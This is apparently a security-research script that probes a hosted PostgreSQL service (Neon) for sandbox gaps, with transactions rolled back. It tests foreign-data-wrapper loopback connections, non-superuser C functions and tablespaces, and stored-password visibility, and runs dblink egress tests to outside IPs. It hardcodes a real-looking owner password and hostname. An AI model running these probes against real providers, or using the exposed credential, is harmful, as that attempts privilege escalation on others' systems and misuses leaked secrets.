# -*- coding: utf-8 -*-
"""MySQL 借鉴面盲区实测:全部事务内回滚零残留
[1] postgres_fdw 可用性 + 连 127.0.0.1 凭据验证(补丁覆盖一致性)
[2] CREATE FUNCTION LANGUAGE C 非 superuser 权限(PG13+ 应拒)
[3] CREATE TABLESPACE 非 superuser(PG16+ 应拒)
[4] pg_user_mapping umoptions 可见性
[5] USER MAPPING 密码存储面
[6] dblink 出网探测(外连是否隔离)"""
import psycopg, time

PWD = 'npg_cI5ynlaAqjU2'
HOST = 'ep-crimson-fog-w2gucld1.us-east-2.aws.neon.build'
URI = 'postgresql://neondb_owner:%s@%s/neondb' % (PWD, HOST)

c = psycopg.connect(URI, connect_timeout=20)
c.autocommit = True
cur = c.cursor()

def q(sql):
    try:
        cur.execute(sql)
        try:
            return cur.fetchall()
        except Exception:
            return 'OK(no rows)'
    except Exception as e:
        return 'ERR: %s' % str(e)[:220]

def tx(sqls):
    """事务内执行多语句并回滚,返回每步结果"""
    out = []
    c2 = psycopg.connect(URI, connect_timeout=20)
    c2.autocommit = False
    cur2 = c2.cursor()
    try:
        for s in sqls:
            try:
                cur2.execute(s)
                try:
                    cur2.fetchall()
                    out.append(('OK', s[:80]))
                except Exception:
                    out.append(('OK(no rows)', s[:80]))
            except Exception as e:
                out.append(('ERR: %s' % str(e)[:180], s[:80]))
                c2.rollback()
                break
        c2.rollback()
    finally:
        c2.close()
    return out

print('=== [1] postgres_fdw 可用性 + 安装 + 127.0.0.1 直连测试 ===')
print('available:', q("SELECT name, default_version FROM pg_available_extensions WHERE name LIKE '%fdw%' OR name LIKE '%dblink%'"))
print('installed:', q("SELECT extname FROM pg_extension WHERE extname LIKE '%fdw%'"))
print('\n--- 事务内: CREATE EXTENSION postgres_fdw; CREATE SERVER; USER MAPPING(真密码); IMPORT/查询 ---')
r = tx([
    "CREATE EXTENSION IF NOT EXISTS postgres_fdw",
    "CREATE SERVER k_fdw_srv FOREIGN DATA WRAPPER postgres_fdw OPTIONS (host '127.0.0.1', port '5432', dbname 'neondb')",
    "CREATE USER MAPPING FOR CURRENT_USER SERVER k_fdw_srv OPTIONS (user 'neondb_owner', password '%s')" % PWD,
    "SELECT * FROM postgres_fdw_get_connections()",
])
for x in r: print(x)
print('--- fdw 连 127.0.0.1 查询(与 dblink 对比凭据验证) ---')
r = tx([
    "CREATE FOREIGN TABLE k_fdw_probe (id int) SERVER k_fdw_srv OPTIONS (schema_name 'public', table_name 'health_check')",
    "SELECT * FROM k_fdw_probe LIMIT 1",
])
for x in r: print(x)

print('\n=== [2] CREATE FUNCTION LANGUAGE C 非 superuser(事务回滚) ===')
print(tx([
    "CREATE FUNCTION k_c_probe() RETURNS int AS '$libdir/neon', 'neon_version' LANGUAGE C",
]))
# 若上面因 Neon patch 拒绝,试试最简形式
print(tx([
    "CREATE FUNCTION k_c_probe2() RETURNS int AS '$libdir/pg_session_jwt', 'jwt_wrapper' LANGUAGE C",
]))

print('\n=== [3] CREATE TABLESPACE 非 superuser(事务回滚) ===')
print(tx(["CREATE TABLESPACE k_ts_probe LOCATION '/tmp/k_ts'"]))
print(tx(["CREATE TABLESPACE k_ts_probe2 LOCATION '/var/lib/postgresql/data/tmp_ts'"]))

print('\n=== [4] USER MAPPING 密码可见性(pg_user_mapping) ===')
print(q("SELECT count(*) FROM pg_user_mapping"))

print('\n=== [5] dblink 出网探测(外连隔离确认) ===')
for target, port in [('8.8.8.8', '5432'), ('1.1.1.1', '5432'), ('10.0.0.1', '5432')]:
    t0 = time.time()
    r = q("SELECT dblink_connect('k_out', 'host=%s port=%s dbname=postgres user=neondb_owner password=%s')" % (target, port, PWD))
    dt = time.time() - t0
    print('  %s:%s -> %s (%.1fs)' % (target, port, r, dt))

print('\n=== [6] 平台库(postgres)经 fdw 视角: neondb_owner 在 postgres 库能读什么 ===')
print(q("SELECT datname, datacl::text FROM pg_database WHERE datname IN ('postgres','neondb')"))

c.close()
